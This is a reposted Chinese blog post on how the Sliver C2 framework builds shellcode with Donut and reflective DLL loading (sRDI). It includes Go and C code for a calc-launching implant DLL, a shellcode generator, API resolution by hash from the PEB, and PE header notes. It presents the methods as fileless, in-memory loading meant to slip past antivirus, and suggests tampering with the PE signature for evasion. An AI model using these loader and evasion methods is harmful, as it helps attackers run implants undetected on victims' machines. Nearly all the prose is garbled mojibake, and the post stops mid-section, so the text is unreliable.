<meta name="referrer" content="no-referrer"/>
> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iTBYghDrqIG1V-HTcx3SPg)

å…³é”®è¯ï¼š

*   C2 ç”Ÿæˆ shellcode
    
*   Donut ç”Ÿæˆ shellcode
    
*   Dll åå°„ç”Ÿæˆ shellcode
    
*   Sliver
    
*   PE ç»“æ„
    
*   sRDI ä»£ç é˜…è¯»ä¸ä¼˜åŒ–
    

cobalt strike å¼€å±€æˆ‘ä»¬ä¸€èˆ¬ä¼šç”Ÿæˆä¸€æ®µ shellcodeï¼Œåœ¨é€šè¿‡å…¶ä»–æ‰‹æ®µåœ¨ç›®æ ‡æœºå™¨ä¸ŠåŠ è½½æ‰§è¡Œï¼Œè¿™æ ·çš„å¥½å¤„æ˜¯æ•´ä¸ªè¿‡ç¨‹ (é™¤äº†åŠ è½½å™¨å¤–) æ— æ–‡ä»¶ï¼Œæ‰€æœ‰æ‰§è¡Œéƒ½æ˜¯åœ¨å†…å­˜ä¸­è¿›è¡Œï¼Œå¹¶ä¸”ä¹Ÿå¥½è¿›è¡Œåˆ†ç¦»å…æ€ã€‚

cobalt strike shellcode çš„æ‰§è¡Œæµç¨‹æ˜¯ ä¼šå…ˆä» team server æœåŠ¡å™¨ä¸Šä¸‹è½½ beacon.dllï¼Œç„¶ååå°„ dll æ‰§è¡Œã€‚

ä¹‹å‰ä¹Ÿæœ‰å†™è¿‡ä¸€ä¸ªç®€å•çš„ä»»æ„ pe æ–‡ä»¶è½¬æ¢ shellcode åœ¨çº¿ç”Ÿæˆå·¥å…·ï¼šhttps://i.hacking8.com/exe2shellcode/

æœ€è¿‘åœ¨çœ‹ä¸€äº› go è¯­è¨€å†™çš„ c2ï¼Œå®ƒä»¬ä¹Ÿæœ‰ç”Ÿæˆ shellcode çš„é€‰é¡¹ï¼Œæ‰€ä»¥å°±æ¥å­¦ä¹ ä¸€ä¸‹è¿™ä¸ª "å¼€å±€" ä¸€ä¸ª shellcode çš„æ“ä½œæ˜¯å¦‚ä½•å®ç°çš„ï¼Œå¦‚æœæ˜¯è‡ªå·±å†™ c2 ä¹Ÿå¯ä»¥æ¨¡ä»¿ä¸€ä¸‹ã€‚

Sliver
------

Sliver æ˜¯ä¸€ä¸ªå¼€æºçš„ï¼Œè·¨å¹³å°çš„ c2 å¹³å°ï¼Œæ”¯æŒ mTLSã€WireGuardã€HTTP(S)ã€DNS ç­‰å¤šä¸ª C2 æ¤å…¥æ‰‹æ®µï¼Œæ”¯æŒç”Ÿæˆ MacOSã€Windowsã€Linux ç­‰å¤šä¸ªå¹³å°çš„ "æœ¨é©¬"

ä¸‹è½½æºä»£ç ï¼Œæ‰¾å¯»ä¸€ç•ªåï¼Œå‘ç°ç”Ÿæˆ shellcode çš„å‡½æ•°åœ¨`server/generate/binaries.go`çš„`SliverShellcode`å‡½æ•°

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERllRSje14OTfqzw7lj0mMZs0SuuQHZpPvsgCicvbicEEzlukyVdlvJySqA/640?wx_fmt=png)image-20210409150301023

çœ‹æ³¨é‡Šè¯´ç”Ÿæˆ shellcode ä½¿ç”¨çš„ sRDI,sRDI æ˜¯ä»€ä¹ˆåé¢å†è¯´ï¼Œç»†ç»†ä¸€ç¿»ä»£ç å‘ç°äº†ä¸å¯¹ã€‚ã€‚

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERlheo7MOUsfhadOEYD6Ab4UYQ3EfeofiaToYFbCsg01bAkM0Nn9HJjm0g/640?wx_fmt=png)image-20210409150619461

å®ƒå°†åŸæ¥ç”Ÿæˆ srdi çš„å‡½æ•°æ³¨é‡Šäº†ï¼Œç”¨`Donut`ç”Ÿæˆäº† shellcodeï¼Œç¼–è¯‘æœ¨é©¬çš„ go ç¨‹åºç¼–è¯‘é€‰é¡¹ä¹Ÿæ”¹ä¸ºäº†`buildmode=pie`

### Donut shellcode æ˜¯å•¥

sliver ä¸­ä½¿ç”¨çš„æ˜¯è¿™ä¸ªåº“`https://github.com/Binject/go-donut`ç”Ÿæˆ shellcodeï¼Œè¿™ä¸ªåº“æ˜¯`https://github.com/TheWover/donut`çš„ Go å®ç°

donut å¯ä»¥ç”Ÿæˆ x86ã€x64 å¯å†…å­˜æ‰§è¡Œ VBScriptï¼ŒJScriptï¼ŒEXEï¼ŒDLL shellcode çš„å·¥å…·ã€‚

å®ƒå†…éƒ¨ä¼šè‡ªåŠ¨å¯¹ä»£ç æ®µè¿›è¡Œå‹ç¼©å’Œ 128 ä½å¯¹ç§°åŠ å¯†ï¼Œ.net å¯ä»¥ç›´æ¥åŠ è½½ï¼Œæ™®é€šçš„ exe éœ€è¦æœ‰é‡å®šä½ä¿¡æ¯æ‰è¡Œ

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERlBIqAFhNoxmYZFJyxDUdn6sIlXvRAAxRFsF1K3udXyA6m6KWib6rGZlw/640?wx_fmt=png)image-20210409163120606

åšä¸ªå®éªŒæµ‹è¯•ä¸€ä¸‹ï¼Œç¼–å†™ä¸€ä¸ª go ç¨‹åº`main.go`

```
package main

import "os/exec"

func main(){
	_ = exec.Command("calc").Run()
}
```

ç¼–è¯‘

```
go build -builemode=exe -o exe.exe main.go
go build -buildmode=pie -o pie.exe main.go
```

ç”¨ donut è½½å…¥ pie.exe ç”Ÿæˆ shellcode

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERl66xzUrlSoOvaWHg0doHnwVEHvk5FSibv4ox7Kic6tRBcF70YcGIyNiaibg/640?wx_fmt=png)image-20210409163819643

shellcode loader åŠ è½½ä¸€ä¸‹

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERlSETFsg77ibm28wvRmlLziao8bmj2t2t2thAm3l8TU9f6d3MibASL6r5iaQ/640?wx_fmt=png)image-20210409164107061

æˆåŠŸ

ä½†æ˜¯ç”¨ go ç›´æ¥ç”Ÿæˆçš„ exe.exe è½¬æ¢ä¸äº† shellcode

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERlYUYPLd3pYpqTd03Rlczzo5B8gwVzv3ehYvhpzFs5OoJuicMXpPibrAXA/640?wx_fmt=png)image-20210409164229686

æç¤ºæ²¡æœ‰é‡å®šä½ä¿¡æ¯ã€‚

#### ä¸ºä»€ä¹ˆéœ€è¦é‡å®šä½è¡¨ï¼Ÿ

æ²¡æœ‰ä»”ç»†çœ‹æºç ï¼Œæˆ‘çŒœçš„ - =

donut å°† exe åŠ è½½åˆ°å†…å­˜ä¸­å±•å¼€ï¼Œå¦‚æœæœ‰é‡å®šä½è¡¨ï¼Œå°±å¯ä»¥åŠ è½½ PE æ–‡ä»¶åˆ°ä»»æ„ä½ç½®ï¼Œç„¶åæ ¹æ®é‡å®šä½è¡¨æ¥ä¿®å¤é‚£äº›ç»å¯¹åœ°å€çš„ä½ç½®å°±è¡Œäº†ã€‚

å¦‚æœæ²¡æœ‰é‡å®šä½è¡¨ï¼Œå†…å­˜ä¸­çš„ PE æ–‡ä»¶å±•å¼€å¯èƒ½ä¼šè·Ÿ shellcode loader æ–‡ä»¶å†²çªï¼Œå¦‚æœæ”¾åˆ°å†…å­˜ä¸­ä»»æ„ä½ç½®ï¼Œå¯èƒ½å› ä¸ºç»å¯¹åœ°å€çš„é—®é¢˜é€ æˆå¤±è´¥ã€‚

### å†å²æ–‡ä»¶ä¿¡æ¯

sliver æ³¨é‡Šäº†`ShellcodeRDI`ï¼Œåå°„ dll(rdi) ç”Ÿæˆ shellcode çš„æ–¹å¼ï¼Œä¸ºå•¥ï¼Ÿ

çœ‹æ–‡ä»¶çš„å†å²è®°å½•ä¿¡æ¯ï¼Œå‘ç°å®ƒæ˜¯åœ¨ç”¨`rdi`ç”Ÿæˆ shellcode è¿˜æ˜¯`donut`ç”Ÿæˆ shellcode çš„æ–¹å¼ä¸Šè½¬æ¥è½¬å» - =

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERlR7ibkQrpDDHsxZYd2UdEScgCsTmfbzJPwmQlG57UlX2ib4UwVmyO4j6g/640?wx_fmt=png)image-20210409164742378

*   2020/5/16 ç¼–å†™äº†ä½¿ç”¨ rdi æ–¹å¼ç”Ÿæˆ shellcode çš„æ–¹å¼
    
*   2020/8/13 æ”¹ç”¨äº† Donut ç”Ÿæˆ
    
*   2020/10/5 åˆæŠŠ rdi çš„æ–¹å¼æ¢äº†å›å»
    
*   2020/10/21 åˆæ¢æˆäº† Donut ç”Ÿæˆ
    
*   2020/11/15 åˆæ¢æˆ rdi æ–¹å¼
    
*   2021/3/8 Â å’æ¢æˆäº† Donut ç”Ÿæˆ shellcode çš„æ–¹å¼ï¼Œä¸‹é¢æ³¨é‡Šäº†ä¸€è¡Œ rdi çš„æ–¹å¼
    

å¯èƒ½å®ƒä»¬ä¹Ÿåœ¨è¿™ä¸¤ç§æ–¹å¼ä¸ŠçŠ¹è±«ä¸å®š - = ?

æ‰€ä»¥å†æ¥çœ‹çœ‹åå°„ dll ç”Ÿæˆ shellcode æ–¹å¼æ˜¯æ€æ ·çš„ã€‚

åå°„ Dll ç”Ÿæˆ shellcode(sRDI)
-------------------------

### åŸç†

åå°„ dll åŸå…ˆæ˜¯ä½œä¸ºæ³¨å…¥æŠ€æœ¯æ¥ä½¿ç”¨çš„ï¼Œå®ƒå¯ä»¥åœ¨å†…å­˜ä¸­åŠ è½½æ‰§è¡Œ dllï¼Œæ¥é€ƒè„±æ€è½¯å¯¹ç£ç›˜æ–‡ä»¶çš„ç›‘æ§ã€‚åæ¥ç»è¿‡æ”¹é€ å°†å®ƒå˜æˆäº† shellcode çš„æ–¹å¼ï¼Œå¯ä»¥å°†ä»»æ„ dll å˜æˆå¯ä»¥åå°„çš„ shellcodeï¼Œç”¨æ¥åŠ è½½æˆ‘ä»¬è‡ªå·± rat ç­‰ç¨‹åºã€‚

### ç”Ÿæˆ sRDI shellcode

sliver ç”Ÿæˆåå°„ dll shellcode çš„ä»£ç åœ¨`server/generate/srdi.go` `ShellcodeRDI`å‡½æ•°ã€‚å®ƒé‡Œé¢çš„ go ä»£ç å°±æ˜¯ https://github.com/monoxgas/sRDI è¿™ä¸ªé¡¹ç›®çš„å®ç°ã€‚

sliver å·²ç»å°†å®ƒå°è£…å¥½äº†ï¼Œåªéœ€è¦ä¼ å…¥ dll è·¯å¾„ï¼Œå‡½æ•°åç§°å°±èƒ½å¤Ÿç”Ÿæˆ shellcode

#### go ç”Ÿæˆ dll

ä»¥ä¸‹ä»£ç éƒ½æ˜¯ä» silver æ‹¿å‡ºæ¥çš„ã€‚

`main.h`

```
#include <windows.h>

void RunSliver();

BOOL WINAPI DllMain(
    HINSTANCE _hinstDLL, // handle to DLL module
    DWORD _fdwReason,    // reason for calling function
    LPVOID _lpReserved   // reserved
);
```

`main.go`

```
package main

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

//#include "main.h"
import "C"
import (
	"os/exec"
)

var isRunning bool = false

// RunSliver - Export for shared lib build
//export RunSliver
func RunSliver() {
	if !isRunning {
		isRunning = true
		main()
	}
}

// Thanks Ne0nd0g for those
//https://github.com/Ne0nd0g/merlin/blob/master/cmd/merlinagentdll/main.go#L65

// DllInstall is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
//export DllInstall
func DllInstall() { main() }

func main() {
	_ = exec.Command("calc.exe").Run()
}
```

å…¬å¼€äº†å¾ˆå¤šæ¥å£ï¼Œæ–¹ä¾¿å¯ä»¥ç”¨ regsvr32 ç­‰ç¨‹åºè°ƒç”¨ï¼Œå¹¶ä¸”æœ‰äº’æ–¥å˜é‡é˜²æ­¢å‡½æ•°è¢«é‡å¤è°ƒç”¨ã€‚

**ç¼–è¯‘æˆ dll**

```
go build -ldflags "-s -w" -buildmode=c-shared -o export.dll main.go
```

#### go è°ƒç”¨ sRDI ç”Ÿæˆ shellcode

å¤åˆ¶ sliver ä¸‹ `server/generate/srdi.go` `server/generate/srdi-shellcode.go` åˆ°åŒä¸€ä¸ªç›®å½•ï¼Œç„¶åæ–°å»ºä¸€ä¸ª go æ–‡ä»¶`generate.go`

```
package main

import (
	"fmt"
	"io/ioutil"
	"os"
)

func main() {
	filename := "export.dll"
	functionName := "RunSliver"
	filepath := "shellcode.bin"

	data, err := ShellcodeRDI(filename, functionName, "")
	if err != nil {
		panic(err)
	}
	fmt.Println(len(data))
	_ = os.Remove(filepath)
	err = ioutil.WriteFile(filepath, data, 0644)
	if err != nil {
		panic(err)
	}
}
```

æ‰§è¡Œåå°±èƒ½ç”Ÿæˆ shellcode äº†

sRDI ä»£ç é˜…è¯»
---------

åšä¸ªè®°å½•ï¼ŒsRDI çš„ä¸€äº›åŠ è½½æ­¥éª¤ã€‚

### ä» PEB è·å– LoadLibraryAã€GetProcAddress

ä¸€èˆ¬çš„æ€è·¯æ˜¯éå† PEB-ldrï¼Œå¾—åˆ° dll åˆ—è¡¨ï¼Œéå†æ¯ä¸ª dllï¼Œè·å– dll çš„å¯¼å‡ºå‡½æ•°, å®é™…ä¸Šåªéœ€è¦éå† kernal32.dllï¼Œè·å–`LoadLibraryA`ã€`GetProcAddress`ä¸¤ä¸ªå‡½æ•°å°±å¯ä»¥æ ¹æ®å®ƒä»¬æ¥åŠ è½½ä»»æ„ dllã€‚

ç»“åˆ windbg æ¥çœ‹ PEB æ•°æ®ç»“æ„

```
dt nt!_peb
```

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERlMwFZHFmIWzwSZ97sK83Um4wElYhD6JWocbNvicN1F9NiaicI18ib5ib2mvA/640?wx_fmt=png)image-20210412170106682

0x18 Ldr åœ°å€ä¸Šä¿å­˜äº†æ‰€æœ‰ dll ä¿¡æ¯ï¼ŒæŸ¥çœ‹ peb_ldr æ•°æ®

```
dt nt!_peb_ldr_data
```

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERlJzmPtfQFIpUzLlRHjhyh6dLnycxPKpC3NXjkx74EL65uAQcHHNIjgg/640?wx_fmt=png)image-20210412170301416

`InLoadOrderModuleList`ã€`InMemoryOrderModuleList`ã€`InInitializationOrderModuleList` ä¸‰ä¸ªä½ç½®éƒ½ä¿å­˜äº† dll åˆ—è¡¨ã€‚

åˆ†åˆ«æ˜¯æŒ‰ç…§é¡ºåºã€å†…å­˜ã€åˆå§‹åŒ–é¡ºåºåŠ è½½ã€‚å®ƒä»¬éƒ½æ˜¯ list_entry ç»“æ„ï¼ŒæŸ¥çœ‹è¿™ä¸ªç»“æ„

```
dt nt!_list_entry
```

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERl27hS6MsPCCqe8ImudJW15mR9sD9KM6qdrHbo4ug40nHr3Fuw3KZaYQ/640?wx_fmt=png)image-20210412170501024

æ˜¯ä¸€ä¸ªåŒé“¾è¡¨ç»“æ„, é“¾è¡¨æŒ‡å‘çš„æ•°æ®ç»“æ„

```
dt nt!_ldr_data_table_entry
```

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERlCwoDb3owNLsKPm54qrIsgWIeyibiaJMR0iaJ0XDJnNlE7CFFicnbkZVlXw/640?wx_fmt=png)image-20210412171719819

DllBase æ˜¯ dll çš„åŸºå€ï¼ŒBaseDllName æ˜¯ dll çš„åç§°ã€‚

å¦‚æœ BaseDllName åˆ¤æ–­æˆåŠŸï¼Œè§£æ DllBase çš„ PE ç»“æ„è·å–å¯¼å‡ºè¡¨ï¼Œå¾—åˆ°å¯¼å‡ºå‡½æ•°çš„åœ°å€ï¼Œè°ƒç”¨å³å¯ã€‚

### åŠ¨æ€åˆå§‹åŒ–å‡½æ•°

ç”± LoadLibraryAã€GetProcAddressï¼Œå°±å¯ä»¥æ¥åŠ è½½æ›´å¤š API äº†ã€‚

```
///
// STEP 1: locate all the required functions
///

pLdrLoadDll = (LDRLOADDLL)GetProcAddressWithHash(LDRLOADDLL_HASH);
pLdrGetProcAddress = (LDRGETPROCADDRESS)GetProcAddressWithHash(LDRGETPROCADDRESS_HASH);

uString.Buffer = sKernel32;
uString.MaximumLength = sizeof(sKernel32);
uString.Length = sizeof(sKernel32);

//pMessageBoxA = (MESSAGEBOXA)GetProcAddressWithHash(MESSAGEBOXA_HASH);

pLdrLoadDll(NULL, 0, &uString, &library);

FILL_STRING_WITH_BUF(aString, sVirtualAlloc);
pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pVirtualAlloc);

FILL_STRING_WITH_BUF(aString, sVirtualProtect);
pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pVirtualProtect);

FILL_STRING_WITH_BUF(aString, sFlushInstructionCache);
pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pFlushInstructionCache);

FILL_STRING_WITH_BUF(aString, sGetNativeSystemInfo);
pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pGetNativeSystemInfo);

FILL_STRING_WITH_BUF(aString, sSleep);
pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pSleep);

FILL_STRING_WITH_BUF(aString, sRtlAddFunctionTable);
pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pRtlAddFunctionTable);

FILL_STRING_WITH_BUF(aString, sLoadLibrary);
pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pLoadLibraryA);
```

ä»”ç»†çœ‹å¯ä»¥å‘ç°ï¼Œsrdi è·å–çš„æ˜¯ ntdll ä¸­çš„`LDRLOADDLL`ã€`LDRGETPROCADDRESS`ä¸­çš„åœ°å€ï¼Œé€šè¿‡å®ƒä»¬æ¥åŠ è½½æ›´å¤šå‡½æ•°ã€‚

### å±•å¼€å†…å­˜ä¸­çš„ dll

æ­¤æ—¶çš„åŸºåœ°å€å°±æ˜¯ dll åœ¨å†…å­˜ä¸­çš„åœ°å€ (`dllData`)ï¼Œæƒ³è¦åå°„æ‰§è¡Œ dllï¼Œéœ€è¦åˆ†æ dll çš„ PE ç»“æ„æ‰‹åŠ¨å±•å¼€åˆ°å†…å­˜ä¸­ã€‚

**è·å– PE header åœ°å€**

ç¬¬ä¸€æ­¥è·å– PE header ç»“æ„çš„åœ°å€ï¼Œå°±æ˜¯é€šè¿‡ dll çš„åœ°å€åŠ ä¸Š Dos Header çš„ä¸€ä¸ªåç§»åœ°å€ã€‚

```
ntHeaders = (PIMAGE_NT_HEADERS)(dllData+((PIMAGE_DOS_HEADER)dllData)->e_lfanew);
```

`PIMAGE_DOS_HEADER`çš„ç»“æ„å¯¹äºæˆ‘ä»¬æ¥è¯´åŸºæœ¬æ²¡ç”¨ï¼Œæ‰€ä»¥å¯ä»¥å°† dll çš„è¿™éƒ¨åˆ†å‡æ‰ï¼ŒåŒæ—¶ PE å¤´ä¼šæœ‰`Signature`å­—æ®µç‰¹å¾ï¼Œåˆ¶ä½œ dll çš„æ—¶å€™å¯ä»¥æœ‰æ„è¯†çš„å°†å®ƒæ¢æˆåˆ«çš„æ¥ç»•è¿‡æ€æ¯’ã€‚

> ```
> Signature;å›ºå®šä¸º 0x00004550 æ ¹æ®å°ç«¯å­˜å‚¨ä¸ºï¼šPE..
> ```

PS å¤ä¹ ä¸‹ PE header çš„ç»“æ„ (64 ä½ä¸‹)

```
typedef struct _IMAGE_NT_HEADERS64 {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

typedef struct _IMAGE_FILE_HEADER {
    WORD    Machine;               // è¿è¡Œå¹³å° 32ä½(0x10b) 64ä½(0x20b) ROM(0x107)
    WORD    NumberOfSections;      // æ–‡ä»¶çš„sectionæ•°ç›®
    DWORD   TimeDateStamp;         // æ–‡ä»¶åˆ›å»ºæ—¥æœŸå’Œæ—¶é—´
    DWORD   PointerToSymbolTable;  // æŒ‡å‘ç¬¦å·è¡¨(ä¸»è¦ç”¨äºè°ƒè¯•)
    DWORD   NumberOfSymbols;       // ç¬¦å·è¡¨ä¸­ç¬¦å·ä¸ªæ•°(åŒä¸Š)
    WORD    SizeOfOptionalHeader;  // IMAGE_OPTIONAL_HEADER ç»“æ„å¤§å°
    WORD    Characteristics;       // æ–‡ä»¶å±æ€§
} IMAGE_FILE_HEADER,

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    WORD        Magic;
    BYTE        MajorLinkerVersion;
    BYTE        MinorLinkerVersion;
    DWORD       SizeOfCode;                    // ä»£ç æ®µçš„å¤§å°
    DWORD       SizeOfInitializedData;
    DWORD       SizeOfUninitializedData;
    DWORD       AddressOfEntryPoint;           // ç¨‹åºæ‰§è¡Œå…¥å£RVA
    DWORD       BaseOfCode;
    ULONGLONG   ImageBase;                     // æ–‡ä»¶è½½å…¥å†…å­˜åŠ è½½åˆ°çš„åœ°å€
    DWORD       SectionAlignment;              // è½½å…¥å†…å­˜çš„section å¯¹é½å¤§å°
    DWORD       FileAlignment;                 // ç£ç›˜ä¸ŠPEæ–‡ä»¶section å¯¹é½å¤§å°
    WORD        MajorOperatingSystemVersion;
    WORD        MinorOperatingSystemVersion;
    WORD        MajorImageVersion;
    WORD        MinorImageVersion;
    WORD        MajorSubsystemVersion;
    WORD        MinorSubsystemVersion;
    DWORD       Win32VersionValue;
    DWORD       SizeOfImage;                   // Imageå¤§å°,å†…å­˜ä¸­æ•´ä¸ªPEæ–‡ä»¶çš„æ˜ å°„çš„å°ºå¯¸ï¼Œå¯æ¯”å®é™…çš„å€¼å¤§ï¼Œå¿…é¡»æ˜¯SectionAlignmentçš„æ•´æ•°å€
    DWORD       SizeOfHeaders;                 // æ‰€æœ‰å¤´èŠ‚è¡¨æŒ‰ç…§æ–‡ä»¶å¯¹é½åçš„å¤§å° e_lfanew+sizeof(signature)+sizeof(_IMAGE_FILE_HEADER)+sizeof(_IMAGE_OPTIONAL_HEADER)+sizeof(_IMAGE_SECTION_HEADER)
    DWORD       CheckSum;                      // æ ¡éªŒå’Œ
    WORD        Subsystem;                     // æ ‡è¯†å¯æ‰§è¡Œæ–‡ä»¶æ‰€æœŸæœ›çš„å­ç³»ç»Ÿ
    WORD        DllCharacteristics;
    ULONGLONG   SizeOfStackReserve;
    ULONGLONG   SizeOfStackCommit;
    ULONGLONG   SizeOfHeapReserve;
    ULONGLONG   SizeOfHeapCommit;
    DWORD       LoaderFlags;
    DWORD       NumberOfRvaAndSizes;          // å…¶ä½™éƒ¨åˆ†ä¸­çš„ç›®å½•æ¡ç›®æ•°ã€‚æ¯ä¸ªæ¡ç›®éƒ½æè¿°äº†ä¸€ä¸ªä½ç½®å’Œå¤§å°
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; //æ•°æ®ç›®å½•
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

// æ•°æ®ç›®å½•è¡¨
typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD   VirtualAddress;
    DWORD   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
```

PS: æ•°æ®ç›®å½•è¡¨çš„ç»“æ„éå¸¸ç®€å•, å°±åªæœ‰èµ·å§‹ä½ç½®å’Œé•¿åº¦å¤§å°è¿™ä¸¤ä¸ªå‚æ•°ç»„æˆ, ç”±æ­¤å¯ä»¥çŸ¥é“è¿™ä¸ªè¡¨çš„å¼€å§‹ä½ç½®å’Œç»“æŸä½ç½®, è™½ç„¶åœ¨ç»“æ„ä½“ä¸­æ²¡æœ‰æŒ‡æ˜å“ªä¸€éƒ¨åˆ†æ˜¯ä»€ä¹ˆç±»å‹çš„è¡¨, ä½†æ˜¯åœ¨ç›®å½•è¡¨ä¸­çš„å…¶ä»–è¡¨, å¦‚å¯¼å…¥è¡¨å¯¼å‡ºè¡¨; æ˜¯æœ‰ä¸€å®šçš„é¡ºåºçš„, ç±»ä¼¼æ•°ç»„æ’åˆ—, æ’åˆ—æ–¹å¼ä»¥åŠå„ä¸ªè¡¨çš„ä½œç”¨ä¸å«ä¹‰å¦‚ä¸‹:

```
// Directory Entries
// æŒ‰é¡ºåºæ’åˆ—çš„æ•°æ®ç›®å½•è¡¨

#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory  å¯¼å‡ºè¡¨:åŠ¨æ€é“¾æ¥åº“å¯¼å‡ºçš„å‡½æ•°ä¼šæ˜¾ç¤ºåœ¨è¿™é‡Œ
#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory  å¯¼å…¥è¡¨:å†™ç¨‹åºæ—¶è°ƒç”¨çš„åŠ¨æ€é“¾æ¥åº“ä¼šæ˜¾ç¤ºåœ¨è¿™é‡Œ
#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   // Resource Directory  èµ„æºè¡¨:å›¾ç‰‡,å›¾æ ‡,å­—ç¬¦ä¸²,åµŒå…¥çš„ç¨‹åºéƒ½åœ¨è¿™é‡Œ
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   // Exception Directory  å¼‚å¸¸ç›®å½•è¡¨:ä¿å­˜æ–‡ä»¶ä¸­å¼‚å¸¸å¤„ç†ç›¸å…³çš„æ•°æ®
#define IMAGE_DIRECTORY_ENTRY_SECURITY        4   // Security Directory  å®‰å…¨ç›®å½•:å­˜æ”¾æ•°å­—ç­¾åå’Œå®‰å…¨è¯ä¹¦ä¹‹ç±»çš„ä¸œè¥¿
#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   // Base Relocation Table	åŸºç¡€é‡å®šä½è¡¨:ä¿å­˜éœ€è¦æ‰§è¡Œé‡å®šä½çš„ä»£ç åç§»
#define IMAGE_DIRECTORY_ENTRY_DEBUG           6   // Debug Directory  è°ƒè¯•è¡¨
//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)
#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   // Architecture Specific Data  ç¼“å­˜ä¿¡æ¯è¡¨:æœ‰ä¸€äº›ä¿ç•™å­—æ®µå¿…é¡»æ˜¯0
#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   // RVA of GP  å…¨å±€æŒ‡é’ˆåç§»ç›®å½•
#define IMAGE_DIRECTORY_ENTRY_TLS             9   // TLS Directory  çº¿ç¨‹å±€éƒ¨å­˜å‚¨(æš‚æ—¶æœªçŸ¥)
#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   // Load Configuration Directory  è½½å…¥é…ç½®
#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   // Bound Import Directory in headers å­˜å‚¨ä¸€äº›APIçš„ç»‘å®šè¾“å…¥ä¿¡æ¯
#define IMAGE_DIRECTORY_ENTRY_IAT            12   // Import Address Table å¯¼å…¥åœ°å€è¡¨ï¼šå¯¼å…¥å‡½æ•°çš„åœ°å€
#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   // Delay Load Import Descriptors
#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   // COM Runtime descriptor comè¿è¡Œæ—¶çš„ç›®å½•
```

**Section**

DataDirectory æ•°æ®ç›®å½•åé¢å°±æ˜¯ Section(èŠ‚) å¤´ä¿¡æ¯äº†ã€‚

```
//
// Section header format.
//

#define IMAGE_SIZEOF_SHORT_NAME              8

typedef struct _IMAGE_SECTION_HEADER {
    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];    // åç§°
    union {
            DWORD   PhysicalAddress;          // ç‰©ç†åœ°å€
            DWORD   VirtualSize;              // å®é™…ä½¿ç”¨çš„å¤§å°
    } Misc;
    DWORD   VirtualAddress;                   // è£…è½½åˆ°å†…å­˜ä¸­çš„åœ°å€è™šæ‹Ÿåœ°å€
    DWORD   SizeOfRawData;                    // è¯¥å—åœ¨ç£ç›˜ä¸­æ‰€å çš„ç©ºé—´
    DWORD   PointerToRawData;                 // è¯¥å—åœ¨ç£ç›˜æ–‡ä»¶ä¸­çš„åç§»
    DWORD   PointerToRelocations;
    DWORD   PointerToLinenumbers;
    WORD    NumberOfRelocations;
    WORD    NumberOfLinenumbers;
    DWORD   Characteristics;                  // å—å±æ€§
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
```

### åˆå§‹åŒ– dll å†…å­˜ç©ºé—´

è·å–åˆ°äº† PE ç»“æ„åï¼Œå¯ä»¥æ ¹æ®`IMAGE_OPTIONAL_HEADER64->SizeOfImage`çš„å¤§å°åˆå§‹åŒ–å†…å­˜ç©ºé—´ã€‚

